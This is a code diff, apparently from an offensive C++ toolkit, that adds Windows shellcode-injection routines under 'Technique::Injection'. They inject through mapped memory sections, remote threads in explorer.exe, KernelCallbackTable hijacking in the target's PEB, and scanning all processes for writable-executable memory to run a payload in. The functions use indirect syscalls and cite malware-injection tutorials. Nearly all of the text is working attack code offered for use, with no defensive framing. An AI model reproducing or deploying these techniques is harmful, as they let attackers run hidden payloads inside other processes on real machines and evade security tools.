@@ -343,6 +343,501 @@ namespace Technique::Injection
         return TRUE;
     }
 
+    // Reference:
+    // https://cocomelonc.github.io/tutorial/2021/12/13/malware-injection-12.html
+    BOOL ShellcodeExecutionViaMemorySections(
+        Procs::PPROCS pProcs,
+        DWORD dwTargetPID,
+        const std::vector<BYTE>& bytes
+    ) {
+        NTSTATUS status;
+
+        LPVOID lpBuffer = (LPVOID)bytes.data();
+        SIZE_T dwBufferSize = bytes.size();
+
+        // Create a memory section
+        HANDLE hSection;
+        SIZE_T dwSize = 4096;
+        LARGE_INTEGER maxSize = {dwSize};
+        status = CallSysInvoke(
+            &pProcs->sysNtCreateSection,
+            pProcs->lpNtCreateSection,
+            &hSection,
+            SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
+            nullptr,
+            (PLARGE_INTEGER)&maxSize,
+            PAGE_EXECUTE_READWRITE,
+            SEC_COMMIT,
+            nullptr
+        );
+        if (status != STATUS_SUCCESS)
+        {
+            return FALSE;
+        }
+
+        // Bind the object in the memory of the current process for reading and writing.
+        PVOID pLocalBuffer;
+        PVOID pRemoteBuffer;
+        status = CallSysInvoke(
+            &pProcs->sysNtMapViewOfSection,
+            pProcs->lpNtMapViewOfSection,
+            hSection,
+            NtCurrentProcess(),
+            &pLocalBuffer,
+            0,
+            0,
+            nullptr,
+            &dwSize,
+            ViewUnmap,
+            0,
+            PAGE_READWRITE
+        );
+        if (status != STATUS_SUCCESS)
+        {
+            System::Handle::HandleClose(pProcs, hSection);
+            return FALSE;
+        }
+
+        // Open target process
+        HANDLE hTargetProcess = System::Process::ProcessOpen(
+            pProcs,
+            dwTargetPID,
+            PROCESS_ALL_ACCESS
+        );
+        if (!hTargetProcess)
+        {
+            System::Handle::HandleClose(pProcs, hSection);
+            return FALSE;
+        }
+
+        // Bind the object in the memory of the target process for reading and executing.
+        status = CallSysInvoke(
+            &pProcs->sysNtMapViewOfSection,
+            pProcs->lpNtMapViewOfSection,
+            hSection,
+            hTargetProcess,
+            &pRemoteBuffer,
+            0,
+            0,
+            nullptr,
+            &dwSize,
+            ViewUnmap,
+            0,
+            PAGE_EXECUTE_READ
+        );
+        if (status != STATUS_SUCCESS)
+        {
+            System::Handle::HandleClose(pProcs, hSection);
+            System::Handle::HandleClose(pProcs, hTargetProcess);
+            return FALSE;
+        }
+
+        memcpy(pLocalBuffer, lpBuffer, dwBufferSize);
+
+        HANDLE hThread;
+        CallSysInvoke(
+            &pProcs->sysRtlCreateUserThread,
+            pProcs->lpRtlCreateUserThread,
+            hTargetProcess,
+            nullptr,
+            FALSE,
+            0,
+            0,
+            0,
+            (PUSER_THREAD_START_ROUTINE)pRemoteBuffer,
+            nullptr,
+            &hThread,
+            nullptr
+        );
+        if (status != STATUS_SUCCESS)
+        {
+            System::Handle::HandleClose(pProcs, hSection);
+            System::Handle::HandleClose(pProcs, hTargetProcess);
+            return FALSE;
+        }
+
+        if (!System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr))
+        {
+            System::Handle::HandleClose(pProcs, hSection);
+            System::Handle::HandleClose(pProcs, hTargetProcess);
+            System::Handle::HandleClose(pProcs, hThread);
+            return FALSE;
+        }
+
+        // Cleanup
+        CallSysInvoke(
+            &pProcs->sysNtUnmapViewOfSection,
+            pProcs->lpNtUnmapViewOfSection,
+            NtCurrentProcess(),
+            pLocalBuffer
+        );
+        CallSysInvoke(
+            &pProcs->sysNtUnmapViewOfSection,
+            pProcs->lpNtUnmapViewOfSection,
+            hTargetProcess,
+            pLocalBuffer
+        );
+        System::Handle::HandleClose(pProcs, hSection);
+        System::Handle::HandleClose(pProcs, hTargetProcess);
+
+        return TRUE;
+    }
+
+    BOOL ShellcodeExecutionViaFindWindow(
+        Procs::PPROCS pProcs,
+        const std::vector<BYTE>& bytes
+    ) {
+        LPVOID lpBuffer = (LPVOID)bytes.data();
+        SIZE_T dwBufferSize = bytes.size();
+
+        HWND hWindow = FindWindow(L"Shell_TrayWnd", nullptr);
+        if (!hWindow)
+            return FALSE;
+
+        DWORD dwPID;
+        if (GetWindowThreadProcessId(hWindow, &dwPID) == 0)
+        {
+            System::Handle::HandleClose(pProcs, hWindow);
+            return FALSE;
+        }
+
+        HANDLE hProcess = System::Process::ProcessOpen(
+            pProcs,
+            dwPID,
+            PROCESS_ALL_ACCESS
+        );
+        if (!hProcess)
+        {
+            System::Handle::HandleClose(pProcs, hWindow);
+            return FALSE;
+        }
+
+        LPVOID lpRemoteBaseAddr = System::Process::VirtualMemoryAllocate(
+            pProcs,
+            hProcess,
+            nullptr,
+            dwBufferSize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+        );
+        if (!lpRemoteBaseAddr)
+        {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
+            hProcess,
+            lpRemoteBaseAddr,
+            lpBuffer,
+            dwBufferSize,
+            nullptr
+        )) {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        HANDLE hThread = System::Process::RemoteThreadCreate(
+            pProcs,
+            hProcess,
+            (LPTHREAD_START_ROUTINE)lpRemoteBaseAddr,
+            nullptr
+        );
+      
+        System::Handle::HandleClose(pProcs, hWindow);
+        System::Handle::HandleClose(pProcs, hProcess);
+
+        return TRUE;
+    }
+
+    // Reference:
+    // https://cocomelonc.github.io/tutorial/2022/01/24/malware-injection-15.html
+    BOOL ShellcodeExecutionViaKernelContextTable(
+        Procs::PPROCS pProcs,
+        const std::vector<BYTE>& bytes
+    ) {
+        LPVOID lpBuffer = (LPVOID)bytes.data();
+        SIZE_T dwBufferSize = bytes.size();
+
+        // Find a window for explorer.exe
+        HWND hWindow = FindWindow(L"Shell_TrayWnd", nullptr);
+        if (!hWindow)
+            return FALSE;
+
+        DWORD dwPID;
+        if (GetWindowThreadProcessId(hWindow, &dwPID) == 0)
+        {
+            System::Handle::HandleClose(pProcs, hWindow);
+            return FALSE;
+        }
+
+        HANDLE hProcess = System::Process::ProcessOpen(
+            pProcs,
+            dwPID,
+            PROCESS_ALL_ACCESS
+        );
+        if (!hProcess)
+        {
+            System::Handle::HandleClose(pProcs, hWindow);
+            return FALSE;
+        }
+
+        PROCESS_BASIC_INFORMATION pbi;
+        NTSTATUS status = CallSysInvoke(
+            &pProcs->sysNtQueryInformationProcess,
+            pProcs->lpNtQueryInformationProcess,
+            hProcess,
+            ProcessBasicInformation,
+            &pbi,
+            sizeof(pbi),
+            nullptr
+        );
+        if (status != STATUS_SUCCESS)
+        {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        PEB peb;
+        if (!System::Process::VirtualMemoryRead(
+            pProcs,
+            hProcess,
+            pbi.PebBaseAddress,
+            &peb,
+            sizeof(peb),
+            nullptr
+        )) {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        KERNELCALLBACKTABLE_T kct;
+        if (!System::Process::VirtualMemoryRead(
+            pProcs,
+            hProcess,
+            peb.KernelCallbackTable,
+            &kct,
+            sizeof(kct),
+            nullptr
+        )) {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        LPVOID lpRemoteBaseAddr = System::Process::VirtualMemoryAllocate(
+            pProcs,
+            hProcess,
+            nullptr,
+            dwBufferSize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+        );
+        if (!lpRemoteBaseAddr)
+        {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+        
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
+            hProcess,
+            lpRemoteBaseAddr,
+            lpBuffer,
+            dwBufferSize,
+            nullptr
+        )) {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        LPVOID lpTableBaseAddr = System::Process::VirtualMemoryAllocate(
+            pProcs,
+            hProcess,
+            nullptr,
+            sizeof(kct),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+        if (!lpTableBaseAddr)
+        {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+        kct.__fnCOPYDATA = (ULONG_PTR)lpRemoteBaseAddr;
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
+            hProcess,
+            lpTableBaseAddr,
+            &kct,
+            sizeof(kct),
+            nullptr
+        )) {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        // Update the PEB
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
+            hProcess,
+            (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
+            &lpTableBaseAddr,
+            sizeof(ULONG_PTR),
+            nullptr
+        )) {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        COPYDATASTRUCT cds;
+        WCHAR wMsg[] = L"Hello";
+        cds.dwData = 1;
+        cds.cbData = lstrlen(wMsg) * 2;
+        cds.lpData = wMsg;
+
+        SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
+            hProcess,
+            (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
+            &peb.KernelCallbackTable,
+            sizeof(ULONG_PTR),
+            nullptr
+        )) {
+            System::Handle::HandleClose(pProcs, hWindow);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        // Cleanup
+        System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBaseAddr, 0, MEM_RELEASE);
+        System::Process::VirtualMemoryFree(pProcs, hProcess, &lpTableBaseAddr, 0, MEM_RELEASE);
+        System::Handle::HandleClose(pProcs, hProcess);
+
+        return TRUE;
+    }
+
+    BOOL RWXHunting(
+        Procs::PPROCS pProcs,
+        const std::vector<BYTE>& bytes
+    ) {
+        LPVOID lpBuffer = (LPVOID)bytes.data();
+        SIZE_T dwBufferSize = bytes.size();
+
+        BOOL bResult;
+        NTSTATUS status;
+
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE)
+        {
+            return FALSE;
+        }
+
+        PROCESSENTRY32 pe = {0};
+        pe.dwSize = sizeof(PROCESSENTRY32);
+
+        bResult = Process32First(hSnapshot, &pe);
+        if (!bResult)
+        {
+            System::Handle::HandleClose(pProcs, hSnapshot);
+            return FALSE;
+        }
+
+        HANDLE hProcess;
+        HANDLE hThread;
+        SIZE_T dwReturnLength = 0;
+        LPVOID lpAddr = nullptr;
+        MEMORY_BASIC_INFORMATION m;
+        BOOL bFound = FALSE;
+
+        while (bResult)
+        {
+            hProcess = System::Process::ProcessOpen(
+                pProcs,
+                pe.th32ProcessID,
+                MAXIMUM_ALLOWED
+            );
+            if (hProcess)
+            {
+                // Check RWX
+                while (VirtualQueryEx(hProcess, lpAddr, &m, sizeof(m)))
+                {
+                    // status = CallSysInvoke(
+                    //     &pProcs->sysNtQueryVirtualMemory,
+                    //     pProcs->lpNtQueryVirtualMemory,
+                    //     hProcess,
+                    //     lpAddr,
+                    //     MemoryBasicInformation,
+                    //     &m,
+                    //     sizeof(m),
+                    //     &dwReturnLength
+                    // );
+                    // if (status != STATUS_SUCCESS)
+                    //     continue;
+
+                    lpAddr = (LPVOID)((DWORD_PTR)m.BaseAddress + m.RegionSize);
+                    if (m.AllocationProtect == PAGE_EXECUTE_READWRITE)
+                    {
+                        // RWX found!
+                        if (!System::Process::VirtualMemoryWrite(
+                            pProcs,
+                            hProcess,
+                            m.BaseAddress,
+                            lpBuffer,
+                            dwBufferSize,
+                            nullptr
+                        )) {
+                            break;
+                        }
+
+                        hThread = System::Process::RemoteThreadCreate(
+                            pProcs,
+                            hProcess,
+                            (LPTHREAD_START_ROUTINE)m.BaseAddress,
+                            nullptr
+                        );
+                        if (!hThread)
+                            break;
+
+                        System::Handle::HandleWait(
+                            pProcs,
+                            hThread,
+                            FALSE,
+                            nullptr
+                        );
+
+                        bFound = TRUE;
+
+                        break;
+                    }
+                }
+
+                lpAddr = nullptr;
+            }
+
+            if (bFound)
+                break;
+            else
+                bResult = Process32Next(hSnapshot, &pe);
+        }
+
+        System::Handle::HandleClose(pProcs, hSnapshot);
+        System::Handle::HandleClose(pProcs, hProcess);
+
+        return TRUE;
+    }
+
     BOOL AddressOfEntryPointInjection(
         Procs::PPROCS pProcs,
         const std::wstring& wTargetProcess,
@@ -353,8 +848,6 @@ namespace Technique::Injection
 
         STARTUPINFOW si;
         PROCESS_INFORMATION pi;
-        PROCESS_BASIC_INFORMATION pbi;
-        DWORD dwReturnLength = 0;
 
         if (!CreateProcessW(
             nullptr,
@@ -373,6 +866,9 @@ namespace Technique::Injection
 
         HANDLE hProcess = pi.hProcess;
         HANDLE hThread = pi.hThread;
+
+        PROCESS_BASIC_INFORMATION pbi;
+        DWORD dwReturnLength = 0;
 
         // Get target image PEB address and pointer to image base.
         NTSTATUS status = CallSysInvoke(
